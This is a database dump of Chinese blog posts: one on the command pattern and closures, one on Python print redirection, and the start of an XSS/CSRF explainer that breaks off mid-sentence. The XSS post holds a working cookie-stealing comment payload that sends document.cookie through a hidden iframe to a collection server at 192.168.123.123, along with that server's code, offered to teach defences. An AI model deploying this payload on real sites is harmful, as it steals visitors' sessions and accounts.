对象），闭包是完全可以做到等价的。这么一来，就弥补了我们上面用“函数对象”代替类定义实现命令模式的不足，因为我们可以通过闭包的方式让行为附带外部数据。上述“删除文件”的例子完全可以在 Python 中实现如下：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">os</span>\n<span class="kn">import</span> <span class="nn">ttk</span>\n\n<span class="k">def</span> <span class="nf">delete_file</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>\n    <span class="k">def</span> <span class="nf">execute</span><span class="p">():</span>\n        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>\n            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>\n    <span class="k">return</span> <span class="n">execute</span>\n\n<span class="n">root</span> <span class="o">=</span> <span class="n">ttk</span><span class="o">.</span><span class="n">Frame</span><span class="p">()</span>\n<span class="n">ttk</span><span class="o">.</span><span class="n">Button</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="s">&quot;Remove&quot;</span><span class="p">,</span>\n           <span class="n">command</span><span class="o">=</span><span class="n">delete_file</span><span class="p">(</span><span class="s">&quot;/tmp/myfile&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">pack</span><span class="p">()</span>\n<span class="n">root</span><span class="o">.</span><span class="n">pack</span><span class="p">()</span>\n<span class="n">root</span><span class="o">.</span><span class="n">mainloop</span><span class="p">()</span>\n</pre></div>\n</figure><p>又或者是 Ruby 中，实现如下：</p>\n<figure class="code"><div class="highlight"><pre><span class="nb">require</span> <span class="s1">''tk''</span>\n\n<span class="k">def</span> <span class="nf">delete_file</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>\n  <span class="k">return</span> <span class="nb">lambda</span> <span class="k">do</span>\n    <span class="no">File</span><span class="o">.</span><span class="n">delete</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="k">if</span> <span class="no">File</span><span class="o">.</span><span class="n">exists?</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="ow">and</span> <span class="no">File</span><span class="o">.</span><span class="n">file?</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>\n  <span class="k">end</span>\n<span class="k">end</span>\n\n<span class="n">root</span> <span class="o">=</span> <span class="no">TkRoot</span><span class="o">.</span><span class="n">new</span>\n<span class="no">TkButton</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="k">do</span>\n  <span class="n">text</span> <span class="s2">&quot;Remove File&quot;</span>\n  <span class="n">command</span> <span class="n">delete_file</span><span class="p">(</span><span class="s2">&quot;e:/test.txt&quot;</span><span class="p">)</span>\n  <span class="n">pack</span>\n<span class="k">end</span>\n<span class="n">root</span><span class="o">.</span><span class="n">mainloop</span>\n</pre></div>\n</figure><p>至此，我们已经可以完美地用函数对象（代码块）和闭包，代替只有一个 execute 方法的命令对象。</p>\n</div>\n<div class="section" id="id11">\n<h2>结语</h2>\n<p>无论是函数对象还是词法闭包，我相信都已经是高表达力语言中的常用工具。尤其是上述“简单命令模式”的实现，我相信很多 Pythoner 在使用这种做法的时候根本不会想到这个是“命令模式”。随着语言抽象表达能力越来越高，这些模式终将融于平平常常的代码中。类似的例子还有很多，Python 中大家惯用的装饰器（Decorator） <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id25" id="id12">[8]</a> 语法、还有简单的策略模式、观察者模式，都是此列。</p>\n<p>所以对于设计模式，我觉得 GoF 固然经典，但新近发展中的变化却不容忽视。大家惯用的手法融于语言，而新的设计模式又随之出现。而比起传统模式，新的模式往往抽象程度更高，更贴近“设计”而不是“编码”。例如来自 Ruby 的“惯例优于配置”模式、《Ruby 设计模式》一书作者提出的“你不会用到它”模式都是很好的思想指引。</p>\n<table class="docutils footnote" frame="void" id="id13" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id2">[1]</a></td><td><a class="reference external" href="http://book.douban.com/subject/3338834/">豆瓣的《Ruby 设计模式》书籍介绍</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id14" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id3">[2]</a></td><td><a class="reference external" href="https://www.google.com/#hl=zh-CN&amp;q=%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F">命令模式的 Google 搜索结果</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id15" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id5">[3]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/zh-cn/%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0">匿名函数</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id17" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id6">[4]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/zh-cn/%E9%B8%AD%E5%AD%90%E7%B1%BB%E5%9E%8B">鸭子型别</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id19" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id8">[5]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/zh-cn/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B">函数式编程</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id21" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id9">[6]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/wiki/%E9%97%AD%E5%8C%85_%28%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%29">计算机科学中的“闭包”</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id23" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id10">[7]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/wiki/%E9%97%AD%E5%8C%85_%28%E6%95%B0%E5%AD%A6%29">数学的“闭包”</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id25" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id12">[8]</a></td><td><a class="reference external" href="http://wiki.python.org/moin/PythonDecorators">Python Decorators</a></td></tr>\n</tbody>\n</table>\n</div>', '2014-11-06 23:43:08', 6, '2012-01-14 18:23:00', '2012-01-14 18:23:00', 0, '[["\\u51fd\\u6570", 0.26075859281153374], ["path", 0.20954894834180543], ["\\u95ed\\u5305", 0.19907150092471515], ["\\u5bf9\\u8c61", 0.12925038724539878], ["Ruby", 0.12572936900508325], ["root", 0.11525192158799298], ["\\u6a21\\u5f0f", 0.11099101298484663], ["\\u8bbe\\u8ba1\\u6a21\\u5f0f", 0.10967908230411919], ["public", 0.10477447417090271], ["Python", 0.10477447417090271], ["\\u547d\\u4ee4", 0.09492564711754602], ["file", 0.09429702675381244], ["\\u8bed\\u8a00", 0.0864294138354426], ["JavaScript", 0.08381957933672217], ["execute", 0.08381957933672217], ["base", 0.08381957933672217], ["result", 0.08381957933672217], ["os", 0.08381957933672217], ["ttk", 0.0733421319196319], ["new", 0.06286468450254162]]', NULL, NULL, '最近读《Ruby 设计模式》 [1] （第 n 次重读），对其中的一个观点特别认同：设计模式终将随着语言抽象能力的强化而消失在代码中。正如作者曾经在 C 语言中用函数指针结构体管理操作特定结构体的“面向对象设计模式”，随着面向对象融入语言而消失。GoF 的设计模式很经典，但是在 Ruby、Python 等表达力强大的语言火热之后，部分原来可以称之为“模式”的做法已经开始有了融入语言的趋势。\n虽然这篇博客讨论的是命令模式，但我不会再絮叨一边命令模式是什么，已经有非常详细的资料 [2] 在先了。我想讨论的是关于在相对传统高级语言更“高级”的语言中，命令模式更佳的实现方式。这类语言包括但不限于：Python、Ruby、Scala、JavaScript。\n\n\n代码块与函数对象\nJavaScript、Ruby、Python 等动态语言对比 Java 有个很大的不同，就是让“过程”成了一种可以传递、修改甚至可以向它发送消息的对象。在 Ruby 中，这种对象称之为 Proc（本文称为“代码块”）；Python 和 JavaScript 中，任何一个函数和 lambda 表达式都是这样的对象。这种对象其实就是许多动态语言都有的“匿名函数” [3] 。\n这种特性给了我们将过程保存为对象的可能性。在 C/C++ 里面也有函数指针的概念，但 C/C++ 并不支持随处定义过程，只能把全局定义好的函数用函数指针引用，所以相比之下 Ruby&Python 的这种特性能带来更多的便捷。这种便捷带给我们的，是可以让一部分 GoF 设计模式实现简化，因为 GoF 模式中有大量的行为模式，是和保存过程密切相关的，例如命令模式（Command）、策略模式（Strategy）。\n这种“函数对象”和 GoF 命令模式本质上有相同点：\n\n函数（Command 对象）的定义初始化了一个将被执行的过程；\n对这个函数（Command 对象）调用一定的方法（圆括号调用或者发送 execute 消息）会执行预定义好的过程。\n\n这么一来，我们就有可能用这种“函数对象”替代部分“命令对象”。举个简单的例子，点击一个按钮，触发删除文件的动作。假设 Java 中实现这点所使用的 GUI 框架依赖一个 ActionCommand 接口：\npublic interface ActionCommand {\n    public void execute();\n}\n\n那么我们要做的就是将删除文件的操作封装为实现了 ActionCommand 接口的命令对象。\npublic class DeleteFileCommand implements ActionCommand {\n    public void execute() {\n        File file = new File("/tmp/somefile");\n        if(file.isFile() && file.exists()) { file.delete(); }\n    }\n}\n\n最终使用的时候，讲这个命令对象实例化并传递给 GUI 框架即可。\n// omit...\nbutton.setClickAction(new DeleteFileCommand());\n// omit...\n\n// 我们知道 GUI 框架内部会在按钮被点击的时候执行这个命令：\nActionCommand clickAction = this.clickAction;\nclickAction.execute();\n\n实现有些繁琐，但是我们在 Java 中似乎也较难找到更好的实现方式，毕竟我们要做到的是“保存一个过程，需要的时候才执行”。但是如果在 Python 中呢？我想大多数 Pythoner 不会选择去这么繁琐的方式，因为这样不 Pythonic。事实上，这样不仅不 Pythonic，也不 Ruby Style、JavaScript Style。在支持函数对象（或者代码块、匿名函数，随便怎么叫）的语言中，我们都可以选择更简单、更直观的方式。\nimport os\nimport ttk  # ``from tkinter import ttk`` for py3k\n\ndef deletefile():\n    path = "/tmp/somefile"\n    if os.path.exists(path) and os.path.isfile(path):\n        os.remove(path)\n\nroot = ttk.Frame()\nttk.Button(root, command=deletefile).pack()\nroot.pack()\nroot.mainloop()\n\n这也是我认为简单的命令模式将会融入语言的依据，因为从本质上来看，命令即过程。\n当然，这种用函数对象定义命令的方式也有缺陷。第一个缺陷是对有接口强迫症的同学来说，不定义个接口去约束 Command 会很难受，这点不予评论，我坚持认为会游泳的就是鸭子 [4] ，干嘛非得有鸭子的 DNA。第二个缺陷是如果不能硬编码被删除文件的路径，需要通过参数传入怎么办？或者说的更通用一些，如果命令对象需要传入参数怎么办？在 Java 里面，我们可以：\npublic class DeleteFileCommand implements ActionCommand {\n    private String path;\n    public DeleteFileCommand(String path) { this.path = path; }\n    public void execute() { /* omit */ }\n}\nbutton.setClickAction(new DeleteFileCommand("/tmp/somefile"));\n\n似乎对于这点函数对象就无能为力了，所以我们这时候需要借助另一个有力的工具——词法闭包。\n\n\n高阶函数与闭包\n高阶函数似乎是来自函数式编程 [5] 领域的一个概念，简单来说就是调用一个函数，这个函数返回一个函数。这点在 JavaScript 里面实现的最优雅，也最常用：\nvar pow = function (base) {\n  return function(num) {\n      var result = num;\n      for(var i=1; i<base; i++) {\n        result = result*num;\n      }\n      return result;\n    };\n}\n\nvar pow2 = pow(2);\nconsole.log(pow2(8)); // output: 64\n\n这种特性其实就是“函数对象”的一种体现，它给了我们另一种便捷：通过函数生产函数，也就是通过一个函数来定制 过程 。这种定制本质上和 GoF 设计模式中的许多行为模式是一致的，上面一段计算次方的 JavaScript 可以等价于下面通过类来实现的 Java 代码：\npublic class Pow {\n    private int base;\n    public Pow(int base) { this.base = base; }\n    public int getValueOf(int num) {\n        int result = num;\n        for (int i=1; i<this.base; i++) { result = result * num; }\n        return result;\n    }\n}\nPow pow2 = new Pow(2); // use it\nSystem.out.println(pow2.getValueOf(8));\n\n这段代码和“函数对象”中的范例有微小的不同——JavaScript 版的 pow 函数成功地等价了 Java 版“带参数构造”的实现。仔细观察 pow 中返回的匿名函数对象，就会发现其中引用了一个属于外部作用域（也就是该匿名函数自身所在作用域）的变量 base 。这样乍看没问题，但是仔细推敲不合逻辑：在内部匿名函数被返回之后， pow 函数的一次调用应该已经结束了，其作用域中的变量应该被回收，为何还在匿名函数中可用呢？这就归结于[词法闭包][4]。在 Python、Ruby、Scala、JavaScript 等语言中，词法闭包一般就称呼为“闭包”，我使用全称是因为我曾被严重困扰过——这里的闭包（Closure） [6] 和数学中的闭包（也是 Closure） [7] 没有任何关系。\n维基百科对于这里的闭包定义是这样的：\n\n在计算机科学中，闭包（Closure）是词法闭包（Lexical Closure）的简称，是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外。\n也就是说，一个高阶函数内部的局部变量，被更深一层作用域的函数（也就是被返回的函数）内部的作用域引用之后，其生命期就会被绑定到内部的函数，只要该内部函数生命期未终结，即使高阶函数的生命期已经终结，该变量仍然活着。换言之，闭包让该过程附带上了额外的数据，这样就让过程在一定的情况下可等同于一个类的实例。关于闭包的这一特性，我听过一个最好的描述，可惜不知道出自谁口：\n\n类实例是绑定了行为的数据，闭包是绑定了数据的行为\n也就是说，对于只有一个行为的类实例（例如简单的 Command 对象），闭包是完全可以做到等价的。这么一来，就弥补了我们上面用“函数对象”代替类定义实现命令模式的不足，因为我们可以通过闭包的方式让行为附带外部数据。上述“删除文件”的例子完全可以在 Python 中实现如下：\nimport os\nimport ttk\n\ndef delete_file(path):\n    def execute():\n        if os.path.exists(path) and os.path.isfile(path):\n            os.remove(path)\n    return execute\n\nroot = ttk.Frame()\nttk.Button(root, text="Remove",\n           command=delete_file("/tmp/myfile")).pack()\nroot.pack()\nroot.mainloop()\n\n又或者是 Ruby 中，实现如下：\nrequire ''tk''\n\ndef delete_file(path)\n  return lambda do\n    File.delete(path) if File.exists?(path) and File.file?(path)\n  end\nend\n\nroot = TkRoot.new\nTkButton.new(root) do\n  text "Remove File"\n  command delete_file("e:/test.txt")\n  pack\nend\nroot.mainloop\n\n至此，我们已经可以完美地用函数对象（代码块）和闭包，代替只有一个 execute 方法的命令对象。\n\n\n结语\n无论是函数对象还是词法闭包，我相信都已经是高表达力语言中的常用工具。尤其是上述“简单命令模式”的实现，我相信很多 Pythoner 在使用这种做法的时候根本不会想到这个是“命令模式”。随着语言抽象表达能力越来越高，这些模式终将融于平平常常的代码中。类似的例子还有很多，Python 中大家惯用的装饰器（Decorator） [8] 语法、还有简单的策略模式、观察者模式，都是此列。\n所以对于设计模式，我觉得 GoF 固然经典，但新近发展中的变化却不容忽视。大家惯用的手法融于语言，而新的设计模式又随之出现。而比起传统模式，新的模式往往抽象程度更高，更贴近“设计”而不是“编码”。例如来自 Ruby 的“惯例优于配置”模式、《Ruby 设计模式》一书作者提出的“你不会用到它”模式都是很好的思想指引。\n\n\n\n[1]豆瓣的《Ruby 设计模式》书籍介绍\n\n\n\n\n\n[2]命令模式的 Google 搜索结果\n\n\n\n\n\n[3]匿名函数\n\n\n\n\n\n[4]鸭子型别\n\n\n\n\n\n[5]函数式编程\n\n\n\n\n\n[6]计算机科学中的“闭包”\n\n\n\n\n\n[7]数学的“闭包”\n\n\n\n\n\n[8]Python Decorators\n\n\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(97, 'https://blog.tonyseek.com/post/python-print-stream/', 'Python 中 print 语句的诡异用法', '<p>真是孤陋寡闻了，到了今日看了一篇博客 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id2" id="id1">[1]</a> 才知道 Python 中 <tt class="docutils literal">print</tt> 语句有种类似 C++ 流操作符的诡异用法：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">sys</span>\n\n<span class="n">error_log</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;./error.log&quot;</span><span class="p">,</span> <span class="s">&quot;a&quot;</span><span class="p">)</span>\n<span class="k">print</span> <span class="o">&gt;&gt;</span> <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;some error message&quot;</span>\n<span class="k">print</span> <span class="o">&gt;&gt;</span> <span class="n">error_log</span><span class="p">,</span> <span class="s">&quot;some error message&quot;</span>\n\n<span class="n">error_log</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>\n</pre></div>\n</figure><p>当然了，只有 2.x 的 Python 才有 <tt class="docutils literal">print</tt> 语句一说，在 Python 3.x 中（以及导入了 <tt class="docutils literal">from __future__ import print_function</tt> 的 Python 2.x 中），print 已经变成一个函数了，故上述做法不可行。但是有更好的替代方案：</p>\n<figure class="code"><div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>\n\n<span class="kn">import</span> <span class="nn">sys</span>\n\n<span class="n">error_log</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;./error.log&quot;</span><span class="p">,</span> <span class="s">&quot;a&quot;</span><span class="p">)</span>\n<span class="k">print</span><span class="p">(</span><span class="s">&quot;some error message&quot;</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>\n<span class="k">print</span><span class="p">(</span><span class="s">&quot;some error message&quot;</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">error_log</span><span class="p">)</span>\n\n<span class="n">error_log</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>\n</pre></div>\n</figure><p>老家天气略冷，敲键盘略艰难……</p>\n<table class="docutils footnote" frame="void" id="id2" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id1">[1]</a></td><td><a class="reference external" href="http://blog.xupeng.me/2011/12/08/scgi-and-threading/">SCGI与线程</a></td></tr>\n</tbody>\n</table>', '2014-11-06 23:43:08', 6, '2012-01-14 15:14:00', '2012-01-14 15:14:00', 0, '[["error", 1.4490627276242423], ["log", 0.9660418184161615], ["print", 0.9660418184161615], ["some", 0.4830209092080808], ["message", 0.4830209092080808], ["Python", 0.4830209092080808], ["sys", 0.4830209092080808], ["import", 0.36226568190606057], ["__", 0.2415104546040404], ["file", 0.2415104546040404], ["close", 0.2415104546040404], ["open", 0.2415104546040404], ["stderr", 0.2415104546040404], ["\\u8bed\\u53e5", 0.1910712403129293], ["bin", 0.1207552273020202], ["env", 0.1207552273020202], ["usr", 0.1207552273020202], ["function", 0.1207552273020202], ["python", 0.1207552273020202], ["C++", 0.1207552273020202]]', NULL, NULL, '真是孤陋寡闻了，到了今日看了一篇博客 [1] 才知道 Python 中 print 语句有种类似 C++ 流操作符的诡异用法：\nimport sys\n\nerror_log = open("./error.log", "a")\nprint >> sys.stderr, "some error message"\nprint >> error_log, "some error message"\n\nerror_log.close()\n\n当然了，只有 2.x 的 Python 才有 print 语句一说，在 Python 3.x 中（以及导入了 from __future__ import print_function 的 Python 2.x 中），print 已经变成一个函数了，故上述做法不可行。但是有更好的替代方案：\n#!/usr/bin/env python\n\nimport sys\n\nerror_log = open("./error.log", "a")\nprint("some error message", file=sys.stderr)\nprint("some error message", file=error_log)\n\nerror_log.close()\n\n老家天气略冷，敲键盘略艰难……\n\n\n\n[1]SCGI与线程\n\n', NULL, NULL, NULL),
(98, 'https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/', '总结 XSS 与 CSRF 两种跨站攻击', '<p>在那个年代，大家一般用拼接字符串的方式来构造动态 SQL 语句创建应用，于是 SQL 注入成了很流行的攻击方式。在这个年代， 参数化查询 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id4" id="id1">[1]</a> 已经成了普遍用法，我们已经离 SQL 注入很远了。但是，历史同样悠久的 XSS 和 CSRF 却没有远离我们。由于之前已经对 XSS 很熟悉了，所以我对用户输入的数据一直非常小心。如果输入的时候没有经过 Tidy 之类的过滤，我一定会在模板输出时候全部转义。所以个人感觉，要避免 XSS 也是很容易的，重点是要“小心”。但最近又听说了另一种跨站攻击 CSRF ，于是找了些资料了解了一下，并与 XSS 放在一起做个比较。</p>\n\n<div class="section" id="xss">\n<h2>XSS：脚本中的不速之客</h2>\n<p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>\n<p>运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：</p>\n<figure class="code"><div class="highlight"><pre><span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>\n    <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;你关不掉我~&quot;</span><span class="p">);</span>\n<span class="p">}</span>\n</pre></div>\n</figure><p>也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>\n<figure class="code"><div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>\n<span class="c">#-*- coding:utf-8 -*-</span>\n\n<span class="sd">&quot;&quot;&quot;</span>\n<span class="sd">跨站脚本注入的信息收集服务器</span>\n<span class="sd">&quot;&quot;&quot;</span>\n\n<span class="kn">import</span> <span class="nn">bottle</span>\n\n<span class="n">app</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">Bottle</span><span class="p">()</span>\n<span class="n">plugin</span> <span class="o">=</span> <span class="n">bottle</span><span class="o">.</span><span class="n">ext</span><span class="o">.</span><span class="n">sqlite</span><span class="o">.</span><span class="n">Plugin</span><span class="p">(</span><span class="n">dbfile</span><span class="o">=</span><span class="s">''/var/db/myxss.sqlite''</span><span class="p">)</span>\n<span class="n">app</span><span class="o">.</span><span class="n">install</span><span class="p">(</span><span class="n">plugin</span><span class="p">)</span>\n\n<span class="nd">@app.route</span><span class="p">(</span><span class="s">''/myxss/''</span><span class="p">)</span>\n<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">cookies</span><span class="p">,</span> <span class="n">db</span><span class="p">):</span>\n    <span class="n">SQL</span> <span class="o">=</span> <span class="s">''INSERT INTO &quot;myxss&quot; (&quot;cookies&quot;) VALUES (?)''</span>\n    <span class="k">try</span><span class="p">:</span>\n        <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">SQL</span><span class="p">,</span> <span class="n">cookies</span><span class="p">)</span>\n    <span class="k">except</span><span class="p">:</span>\n        <span class="k">pass</span>\n    <span class="k">return</span> <span class="s">&quot;&quot;</span>\n\n<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>\n    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>\n</pre></div>\n</figure><p>然后在某一个页面的评论中注入这段代码：</p>\n<figure class="code"><div class="highlight"><pre><span class="c1">// 用 &lt;script type=&quot;text/javascript&quot;&gt;&lt;/script&gt; 包起来放在评论中</span>\n\n<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nb">window</span><span class="p">,</span> <span class="nb">document</span><span class="p">)</span> <span class="p">{</span>\n    <span class="c1">// 构造泄露信息用的 URL</span>\n    <span class="kd">var</span> <span class="nx">cookies</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>\n    <span class="kd">var</span> <span class="nx">xssURIBase</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.123.123/myxss/&quot;</span><span class="p">;</span>\n    <span class="kd">var</span> <span class="nx">xssURI</span> <span class="o">=</span> <span class="nx">xssURIBase</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nx">cookies</span><span class="p">);</span>\n    <span class="c1">// 建立隐藏 iframe 用于通讯</span>\n    <span class="kd">var</span> <span class="nx">hideFrame</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;iframe&quot;</span><span class="p">);</span>\n    <span class="nx">hideFrame</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>\n    <span class="nx">hideFrame</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>\n    <span class="nx">hideFrame</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s2">&quot;none&quot;</span><span class="p">;</span>\n    <span class="nx">hideFrame</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">xssURI</span><span class="p">;</span>\n    <span class="c1">// 开工</span>\n    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">hideFrame</span><span class="p">);</span>\n<span class="p">})(</span><span class="nb">window</span><span class="p">,</span> <span class="nb">document</span><span class="p">);</span>\n</pre></div>\n</figure><p>于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。</p>\n<p>我们知道 AJAX 技术所使用的 XMLHttpRequest 对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范 XSS，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用 iframe 也一样可以达到相同的目的。甚至在愿意的情况下，我还能用 iframe 发起 POST 请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的 IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以防止 XSS 的根本之道还是过滤用户输入。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。</p>\n<p>正如上文所说，如果我们不需要用户输入 HTML 而只想让他们输入纯文本，那么把所有用户输入进行 HTML 转义输出是个不错的做法。似乎很多 Web 开发框架、模版引擎的开发者也发现了这一点，Django 内置模版和 Jinja2 模版总是默认转义输出变量的。如果没有使用它们，我们自己也可以这么做。PHP 可以用 htmlspecialchars 函数，Python 可以导入 cgi 模块用其中的 cgi.escape 函数。如果使用了某款模版引擎，那么其必自带了方便快捷的转义方式。</p>\n<p>真正麻烦的是，在一些场合我们要允许用户输入 HTML，又要过滤其中的脚本。Tidy 等 HTML 清理库可以帮忙，但前提是我们小心地使用。仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。对于复杂的情况，我个人更倾向于使用简单的方法处理，简单的方法就是白名单重新整理。用户输入的 HTML 可能拥有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML 要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失——如果用户的某种复杂输入不能为解析器所识别（前面说了 HTML 不同于 XML，要求有很强的容错性），那么它不会成为漏网之鱼，因为白名单重新整理的策略会直接丢弃掉这些未能识别的部分。最后获得的新 HTML 元素树，我们可以拍胸脯保证——所有的标签、属性都来自白名单，一定不会遗漏。</p>\n<p>现在看来，大多数 Web 开发者都了解 XSS 并知道如何防范，往往大型的 XSS 攻击（包括前段时间新浪微博的 XSS 注入）都是由于疏漏。我个人建议在使用模版引擎的 Web 项目中，开启（或不要关闭）类似 Django Template、Jinja2 中“默认转义”（Auto Escape）的功能。在不需要转义的场合，我们可以用类似 <tt class="docutils literal">{{ myvar | raw }}</tt> 的方式取消转义。这种白名单式的做法，有助于降低我们由于疏漏留下 XSS 漏洞的风险。</p>\n<p>另外一个风险集中区域，是富 AJAX 类应用（例如豆瓣网的阿尔法城）。这类应用的风险并不集中在 HTTP 的静态响应内容，所以不是开启模版自动转义能就能一劳永逸的。再加上这类应用往往需要跨域，开发者不得不自己打开危险的大门。这种情况下，站点的安全非常依赖开发者的细心和应用上线前有效的测试。现在亦有不少开源的 XSS 漏洞测试软件包（似乎有篇文章提到豆瓣网的开发也使用自动化 XSS 